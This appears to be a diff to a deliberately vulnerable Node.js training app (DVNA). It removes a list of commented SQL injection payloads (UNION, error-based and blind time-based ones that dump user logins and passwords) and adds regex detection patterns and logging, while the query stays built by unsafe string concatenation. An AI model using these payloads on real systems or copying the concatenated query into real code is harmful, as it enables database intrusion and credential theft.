@@ -3,42 +3,35 @@ var bCrypt = require('bcrypt')
 const exec = require('child_process').exec;
 var mathjs = require('mathjs')
 const Op = db.Sequelize.Op
+const fs = require('fs');
+
+const writeToLogs = function(time, type, url, request) {
+	const logContent = `{"time": "${time}", "type": "${type}", "url": "${url}", "request": "${request}"}\n`;
+	fs.appendFile('request_logs.txt', logContent, (err) => {
+	    if (err) throw err;
+	});
+}
+
+const sql = new RegExp('w*((%27)|(\'))((%6F)|o|(%4F))((%72)|r|(%52))', 'i')
+const sqlMeta = new RegExp('(%27)|(\')|(--)|(%23)|(#)', 'i')
+const sqlMetaVersion2 = new RegExp('((%3D)|(=))[^\n]*((%27)|(\')|(--)|(%3B)|(;))', 'i')
+const sqlUnion = new RegExp('((%27)|(\'))union', 'i')
+
+function isSqlInjection (value) {
+	return sql.test(value) || sqlMeta.test(value) || sqlMetaVersion2.test(value) || sqlUnion.test(value)
+}
 
 module.exports.userSearch = function(req, res) {
+	const now = new Date();
 	const request_data = req.body
-	var query = "SELECT name,id FROM Users WHERE login='" + request_data.value +
-		"'";
 
-	// # SELECT name,id FROM Users WHERE login='' UNION ALL SELECT NULL,version() #
-	// # SELECT name,id FROM Users WHERE login='' UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='dvna' #
-	// # SELECT name,id FROM Users WHERE login='' UNION ALL SELECT NULL,concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='users' #
-	// # SELECT name,id FROM Users WHERE login='' UNION ALL SELECT NULL,concat(0x28,login,0x3a,password,0x29) FROM users #
-	// # SELECT name,id FROM Users WHERE login='' UNION ALL SELECT NULL,concat(0x28,login,0x3a,password,0x29) FROM dvna.users #
-	// # SELECT name,id FROM Users WHERE login='' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 0,1))) #
-	// # SELECT name,id FROM Users WHERE login='' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="dvna" LIMIT 0,1))) #
-	// # SELECT * FROM Users WHERE login='' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_NAME="users" LIMIT 0,1))) #
-	// # SELECT * FROM Users WHERE login='' AND extractvalue(rand(),concat(0x3a,(SELECT concat(login,0x3a,password) FROM users LIMIT 0,1))) #
-	// # SELECT * FROM Users WHERE login='' AND extractvalue(rand(),concat(0x3a,(SELECT concat(login,0x3a,password) FROM dvna.users LIMIT 0,1))) #
-	// # SELECT * FROM Users WHERE login='' AND(SELECT 1 FROM(SELECT COUNT(*),concat(version(),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #
-	// # SELECT name,id FROM Users WHERE login='' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.TABLES GROUP BY a LIMIT 0,1)b) #
-	// # SELECT name,id FROM Users WHERE login='' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.COLUMNS GROUP BY a LIMIT 0,1)b) #
-	// # SELECT name,id FROM Users WHERE login='' AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT name FROM users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #
-	// # SELECT name,id FROM Users WHERE login='' AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT name FROM dvna.users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #
-	// # SELECT name,id FROM Users WHERE login='' AND (ascii(substr((SELECT version()),1,1))) > 52 #
-	// # SELECT name,id FROM Users WHERE login='' AND (SELECT version()) LIKE "5%" #
-	// # SELECT name,id FROM Users WHERE login='' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) > 95 #
-	// # SELECT name,id FROM Users WHERE login='' AND (ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="dvna" LIMIT 0,1),1,1))) > 95 #
-	// # SELECT name,id FROM Users WHERE login='' AND (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="users" LIMIT 0,1),1,1))) > 95 #
-	// # SELECT name,id FROM Users WHERE login='' AND (ascii(substr((SELECT name FROM users LIMIT 0,1),1,1))) > 95 #
-	// # SELECT name,id FROM Users WHERE login='' AND (ascii(substr((SELECT name FROM dvna.users LIMIT 0,1),1,1))) > 95 #
-	// # SELECT name,id FROM Users WHERE login='' AND sleep(10) #
-	// # SELECT name,id FROM Users WHERE login='' AND IF((SELECT ascii(substr(version(),1,1))) > 53,sleep(10),NULL) #
-	// # SELECT name,id FROM Users WHERE login='' AND IF((SELECT version()) LIKE "5%",sleep(10),NULL) #
-	// # SELECT name,id FROM Users WHERE login='' AND IF(((ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #
-	// # SELECT name,id FROM Users WHERE login='' AND IF(((ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="dvna" LIMIT 0,1),1,1))))> 95,sleep(10),NULL) #
-	// # SELECT name,id FROM Users WHERE login='' AND IF(((ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="users" LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #
-	// # SELECT name,id FROM Users WHERE login='' AND IF(((ascii(substr((SELECT name FROM users LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #
-	// # SELECT name,id FROM Users WHERE login='' AND IF(((ascii(substr((SELECT name FROM dvna.users LIMIT 0,1),1,1)))) >95,sleep(10),NULL) #
+	if (isSqlInjection(request_data.value)) {
+	    writeToLogs(now, 'Bad Request', '/app/sql',  request_data.value);
+	} else {
+			writeToLogs(now, 'Good Request', '/app/sql',  request_data.value);
+	}
+
+	var query = "SELECT name,id FROM Users WHERE login='" + request_data.value + "'";
 
 	db.sequelize.query(query, {
 		model: db.User
